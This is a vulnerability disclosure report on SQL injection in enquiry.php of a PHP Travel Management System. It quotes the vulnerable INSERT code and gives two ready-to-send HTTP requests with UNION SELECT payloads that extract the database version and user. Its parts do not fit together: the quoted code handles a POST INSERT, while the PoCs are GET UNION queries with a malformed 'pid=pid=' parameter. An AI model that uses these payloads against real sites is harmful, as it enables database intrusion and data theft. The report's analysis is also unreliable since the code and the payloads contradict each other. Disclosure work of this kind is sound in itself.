# Travel Management System has sql injection in enquiry.php



## supplier



https://code-projects.org/travel-management-system-using-php-source-code/



## Vulnerability file



/enquiry.php

## describe



Due to the lack of purification or parameterization of PID parameters, attackers can inject malicious SQL code to manipulate database queries. By utilizing the SQL injection technique of UNION query, attackers can use functions such as UNION to directly query the fields required by the database. This can be used to confirm the existence of vulnerabilities and potentially extract sensitive information from the database.

## **Code analysis**

```
<?php
if(isset($_POST["sbmt"]))
{
	$cn=makeconnection();
	$s="insert into enquiry(Packageid,Name,Gender,Mobileno,Email,NoofDays,Child,Adults,Message,Statusfield) values('" . $_REQUEST["pid"] ."','" . $_POST["t1"] ."','" . $_POST["r1"] ."','" . $_POST["t2"] ."','" . $_POST["t3"] ."','" . $_POST["t4"] ."','" . $_POST["t5"] ."','" . $_POST["t6"] ."','" . $_POST["t7"] ."','Pending')";	
	
	
		mysqli_query($cn,$s);
	
	echo "<script>alert('Record Save');</script>";
}
?>
```

## POC1

```
GET /enquiry.php?pid=pid=-8993'+UNION+ALL+SELECT+NULL,version(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+CVWw HTTP/1.1
Host: 192.168.20.133
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-platform: "Android"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="125", "Google Chrome";v="125"
sec-ch-ua-mobile: ?1
Connection: keep-alive
```

![image-20250104133254893](E:\work\me\cve\cve\Travel Management System\image-20250104133254893.png)

## POC2

```
GET /enquiry.php?pid=pid=-8993'+UNION+ALL+SELECT+NULL,user(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+CVWw HTTP/1.1
Host: 192.168.20.133
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-platform: "Android"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="125", "Google Chrome";v="125"
sec-ch-ua-mobile: ?1
Connection: keep-alive


```

![image-20250104133602150](E:\work\me\cve\cve\Travel Management System\image-20250104133602150.png)

![image-20250104133733397](E:\work\me\cve\cve\Travel Management System\image-20250104133733397.png)